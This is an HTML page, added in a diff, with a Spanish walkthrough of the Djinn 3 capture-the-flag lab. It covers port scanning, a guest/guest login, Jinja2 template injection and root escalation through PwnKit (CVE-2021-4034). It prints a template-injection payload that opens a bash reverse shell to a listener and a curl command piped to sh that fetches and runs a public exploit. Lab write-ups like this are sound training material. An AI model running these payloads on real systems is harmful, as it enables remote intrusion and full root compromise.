@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Djinn 3 - Flag Colector</title>
+    <link rel="stylesheet" href="../assets/writeup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="writeup-container">
+        <!-- Encabezado con metadatos -->
+        <div class="writeup-header">
+            <h1><i class="fas fa-skull"></i> Djinn 3</h1>
+            <div class="machine-meta">
+                <span class="meta-item"><i class="fas fa-network-wired"></i> 10.0.2.7</span>
+                <span class="meta-item os linux"><i class="fab fa-linux"></i> Linux</span>
+                <span class="meta-item difficulty medium"><i class="fas fa-bolt"></i> Media</span>
+            </div>
+        </div>
+
+        <!-- Sección de Enumeración -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-search"></i> Enumeración</h2>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>La máquina virtual Mr Robot 1 debe estár previamante configurada con red NAT dentro de nuestro entorno de virtualización, en este caso se usará Virtual Box</h4>
+            </div>
+
+            <h3>Netdiscover</h3>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Primero debemos ver que IP tiene asignada la máquina objetivo</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo netdiscover -i eth1 -r 10.0.2.0/24</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Dijinn3/img/foto1.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 1: Uso de netdiscover</p>
+            </div>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>Las tres primeras IPs son utilizadas por Virtual Box a nivel interno, por lo que no nos interesan</h4>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Vemos que la IP objetivo entonces será la 10.0.2.7</p>
+            </div>
+            
+            <div class="finding">
+                <h3>Nmap</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo nmap -sS -Pn 10.0.2.7</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4>Resultado:</h4>
+                    <p>PORT    STATE SERVICE<br><br>
+                        22/tcp    open ssh<br><br>
+                        80/tcp    open http<br><br>
+                        5000/tcp    open upnp<br><br>
+                        31337/tcp    open Elite<br><br>
+                        MAC Address: 08:00:27:9F:E2:46 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Características detectadas:</h4>
+                    <ul class="findings-list">
+                        <li>Puerto 22: Servidor SSH</li>
+                        <li>Puerto 80: Servidor Web</li>
+                        <li>Puerto 5000: Aplicación Python (probablemente Flask)</li>
+                        <li>Puerto 31337: Servicio personalizado TCP</li>
+                    </ul>
+                </div>
+
+                <h3>Acceso al portal web (Puerto 80)</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Página estática que informa sobre una startup que ofrece software personalizado para gestión de tickets.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto2.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 2: Acceso al servicio web (Puerto 80)</p>
+                </div>
+
+                <h3>Acceso al portal web (Puerto 5000)</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Panel para visualizar tickets en desarrollo. Al inspeccionar con Burp Suite, vemos que es una aplicación Flask (Werkzeug 1.0.1/Python 3.6.9).</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto3.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 3: Acceso al servicio web (Puerto 5000)</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto4.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 4: Cabeceras de la página web (Puerto 5000)</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Si hacemos click en algún ticket vemos que hace uso de plantilla ya que carga el contenido de
+                    forma dinámica mediante un parámetro GET id por URL.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto5.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 5: Parámetros GET por URL</p>
+                </div>
+
+                <h3>Acceso al puerto 31337</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Servicio personalizado TCP que pide autenticación. Intentamos con credenciales por defecto:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>nc 10.0.2.7 31337</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto6.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 6: Autentificación fallida</p>
+                </div>
+
+                <h3>Análisis de tickets</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Ahora haremos un reconocimiento de usuarios.<br><br>
+                        Si navegamos al servicio de visualización de tickets e investigamos los contenidos de los
+                        mismos podemos ver que indican ciertos pasos del mantenimiento y creación de la aplicación.</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Información relevante encontrada:</h4>
+                    <ul class="findings-list">
+                        <li>Se implementó autenticación basada en contraseñas y tokens (Primera Entrada)</li>
+                        <li>Se necesita eliminar el usuario guest por seguridad y que deben
+                            implementar una política de complejidad a las contraseñas.(Segunda Entrada)</li>
+                        <li>Problemas con consultas PostgreSQL (Tercera Entrada)</li>
+                        <li>Usuarios despedidos: jason, devid, freddy. Con privilegios en el sistema (Quinta Entrada)</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección de Explotación -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-bug"></i> Explotación</h2>
+            
+            <div class="exploit-step">
+                <h3>Acceso al servicio del puerto 31337</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Intentamos acceder con el usuario guest:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>nc 10.0.2.7 31337</code>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Credenciales usadas:</h4>
+                    <ul class="findings-list">
+                        <li>username : guest</li>
+                        <li>password : guest</li>
+                    </ul>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Obtenemos acceso con comandos limitados (help, update, open, close, exit)</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto7.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 7: Acceso con el usuario guest</p>
+                </div>
+
+                <h3>Inyección SSTI (Server Side Template Injection)</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Identificamos que la aplicación usa Jinja2 (motor de plantillas para Python). Creamos un ticket con una prueba de SSTI:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>open<br>Title: {{5*5}}<br>Description: {{5*5}}</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto8.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 8: Contenido del ticket</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto9.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 9: Ticket creado</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Al abrir el ticket, vemos que se ejecuta (muestra "25"), confirmando la vulnerabilidad.</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto10.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 10: Ticket con inyección SSTI</p>
+                </div>
+
+                <h3>Shell Reversa</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Explotamos la SSTI para obtener una shell reversa:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>{{ config.__class__.__init__.__globals__['os'].popen("nohup bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'") }}</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Ponemos en escucha el puerto 4444 y hacemos click en el link del ticket para activar la shell.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>nc -nlvp 4444</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Estabilizamos la shell:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>python -c 'import pty;pty.spawn("/bin/bash")'<br>CTRL+Z<br>stty raw -echo; fg<br>export TERM=xterm</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto11.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 11: Creación y estabilización de la Shell Reversa</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección de Post Explotación -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-user-shield"></i> Post Explotación</h2>
+
+            <div class="exploit-step">
+                <h3>Enumeración del sistema</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Encontramos la clave secreta de Flask en webapp.py:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat /opt/.web/webapp.py</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto12.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 12: Análisis del fichero webapp.py</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Dentro de este código veremos una key hardcodeada: <br>app.secret_key = "hackthedaumplanet" <hr> Esta es la clave secreta de Flask, usada para firmar cookies de sesión (flask.session)</p>
+                </div>
+
+                <h3>Escalada de privilegios</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Haciendo una revisión de los usuarios del sistema vemos tres usuarios potencialmente interesantes.</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto13.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 13: Listar usuarios reales, no del sistema</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Vamos a ver binarios con SUID activo</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>find / -perm -4000 -type f 2>/dev/null</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto14.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 14: Binarios con SUID activo.</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>La lista de SUIDs que vemos parece bastante estándar… casi todo lo que ves está en
+                        instalaciones típicas de Linux, excepto uno potencialmente interesante. <br><br>Potencial vector: /usr/bin/pkexec</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Verificamos la versión:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>pkexec --version</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto15.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 15: Pkexec vesrión 0.105</p>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Vulneravilidad encontrada: CVE-2021-4034 — PwnKit</h4>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>CVE-2021-4034 — PwnKit</h4>
+                    <p>Permite escalar de cualquier usuario a root si:</p>
+                    <ul class="findings-list">
+                        <li> El sistema es vulnerable</li>
+                        <li>No se ha parcheado pkexec</li>
+                        <li> Estás en un entorno compatible (Debian/Ubuntu con ciertos setups)</li>
+                    </ul>
+                    <hr>
+                    <p>Polkit (antes PolicyKit) es un sistema para manejar privilegios a nivel de sistema.</p>
+                    <p>Es un fallo en cómo pkexec maneja argumentos y variables de entorno.</p>
+                </div>
+
+                <h3>Explotación de PwnKit</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Como en este caso nuestra máquina cuenta con conexión a internet podemos ejecutar el
+                        oneliner que nos proporciona el exploit (https://github.com/ly4k/PwnKit)</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto16.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 16: Ejecución del exploit</p>
+                </div>
+
+                <h3>Flag 1 - 1</h3>
+
+                <div class="discovery-box-standard">
+                    <p> Una vez ejecutado obtendremos acceso como root:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cd /root</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat proof.sh</code>
+                </div>
+
+                
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dijinn3/img/foto17.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 17: Flag 1 - 1</p>
+                </div>
+
+            </div>
+        </section>
+    </div>
+
+    <script src="../../assets/scripts/copy.js" defer></script>
+</body>
+</html>
